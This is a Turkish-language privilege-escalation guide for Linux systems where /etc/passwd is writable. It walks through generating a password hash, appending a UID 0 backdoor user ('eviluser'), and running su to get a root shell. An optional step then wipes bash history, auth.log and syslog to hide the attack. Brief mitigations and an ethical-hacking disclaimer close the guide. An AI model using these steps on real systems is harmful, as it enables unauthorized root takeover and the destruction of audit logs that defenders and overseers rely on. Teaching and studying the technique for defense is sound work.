### Writable `/etc/passwd` Dosyası ile Privilege Escalation Rehberi

Linux sistemlerinde `/etc/passwd` dosyası, kullanıcı hesap bilgilerini içeren bir dosyadır. Geçmişte şifre hash'leri de bu dosyada tutulurdu, ancak modern sistemlerde şifre hash'leri `/etc/shadow` dosyasına taşınmıştır. Buna rağmen, `/etc/passwd` dosyasının yazılabilir olması ciddi bir güvenlik açığıdır ve privilege escalation (hak yükseltme) için kullanılabilir.

---

#### **1. Vulnerability Confirmation**
İlk olarak, `/etc/passwd` dosyasının yazılabilir olup olmadığını doğrulamalısınız.

```bash
ls -l /etc/passwd
```

Eğer sonuç şu şekildeyse, dosya yazılabilir durumdadır:

```bash
-rw-rw-r-- 1 root root 1234 Jan 15 12:34 /etc/passwd
```

- `rw-` dosyanın sahibi (`root`) için yazma yetkisi olduğunu gösterir.
- `rw-` gruplar için yazma yetkisi olduğunu gösterir.
- `r--` diğer kullanıcılar için yalnızca okuma yetkisi olduğunu gösterir.

Eğer kullanıcı yetkiniz bu dosyayı yazmaya izin veriyorsa, hak yükseltme yapılabilir.

---

#### **2. Yeni Kullanıcı Eklemek**
Hak yükseltme için bu dosyaya, root yetkilerine sahip bir kullanıcı eklenir.

##### 2.1. Yeni Şifre Hash'ini Oluşturmak
Yeni bir şifre için hash oluşturmanız gerekir. `openssl` veya `mkpasswd` komutlarını kullanabilirsiniz.

```bash
openssl passwd -1 -salt evilpassword mypassword
```

Örnek çıktı:

```plaintext
$1$evilpassword$C60KphG9vNqwVlnyJ9z9l0
```

Bu hash, şifresi `mypassword` olan bir kullanıcı için oluşturulmuştur.

##### 2.2. Yeni Kullanıcı Satırını Hazırlamak
`/etc/passwd` dosyasındaki kullanıcı satırlarının formatı şu şekildedir:

```plaintext
username:x:UID:GID:User Info:Home Directory:Shell
```

Hak yükseltme için root yetkilerine sahip bir kullanıcı şu şekilde eklenir:

```plaintext
eviluser:$1$evilpassword$C60KphG9vNqwVlnyJ9z9l0:0:0:Hacked Root:/root:/bin/bash
```

Bu satırdaki:

- `eviluser`: Yeni kullanıcı adı.
- `$1$evilpassword$C60KphG9vNqwVlnyJ9z9l0`: Hashlenmiş şifre.
- `0:0`: UID ve GID. Root yetkileri için her ikisi de `0` olmalıdır.
- `/root`: Kullanıcının home dizini.
- `/bin/bash`: Kullanıcının shell'i.

---

#### **3. `/etc/passwd` Dosyasını Düzenlemek**
Artık yeni kullanıcı satırını dosyaya ekleyebilirsiniz. Eğer sistemde `nano`, `vi` gibi bir editör varsa bunları kullanabilirsiniz:

```bash
nano /etc/passwd
```

Dosyanın sonuna aşağıdaki satırı ekleyin:

```plaintext
eviluser:$1$evilpassword$C60KphG9vNqwVlnyJ9z9l0:0:0:Hacked Root:/root:/bin/bash
```

Dosyayı kaydedin ve çıkın.

---

#### **4. Yeni Kullanıcı ile Root Yetkisi Almak**
Yeni kullanıcı ile sisteme giriş yapın ve root yetkilerini doğrulayın:

```bash
su eviluser
```

Şifreyi girin (`mypassword`). Eğer başarıyla root yetkileri aldıysanız, aşağıdaki gibi bir shell göreceksiniz:

```plaintext
root@target:~#
```

---

#### **5. Logları Temizlemek (Opsiyonel)**
Saldırı izlerini azaltmak için log dosyalarını temizlemek önemlidir.

- `~/.bash_history` dosyasını temizleyin:

```bash
> ~/.bash_history
```

- Sistem loglarını temizleyin (root yetkisiyle):

```bash
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
```

---

#### **6. Önlemler**
Bu zafiyetin sistemde bulunmasını önlemek için aşağıdaki önlemler alınmalıdır:

1. `/etc/passwd` dosyasının yalnızca root tarafından yazılabilir olmasını sağlayın:

```bash
chmod 644 /etc/passwd
```

2. Kullanıcı izinlerini düzenli olarak kontrol edin:

```bash
find / -perm -2 -type f 2>/dev/null
```

Bu komut, sistemde herkes tarafından yazılabilir dosyaları listeler.

3. Güvenlik denetimleri gerçekleştirin ve bir IDS/IPS çözümü uygulayın.

---

#### **7. Örnek Senaryo**
- Hedef sistemde privilege escalation için gereken izinler kontrol edilir.
- `/etc/passwd` yazılabilir bulunur.
- Yeni bir kullanıcı eklenir ve root yetkisi alınır.
- Loglar temizlenir ve erişim kapatılır.

---

Bu yöntem, bir sistemde ciddi bir güvenlik açığından yararlanır. Yalnızca izinli testlerde kullanılmalı ve etik hacking kuralları çerçevesinde gerçekleştirilmelidir.
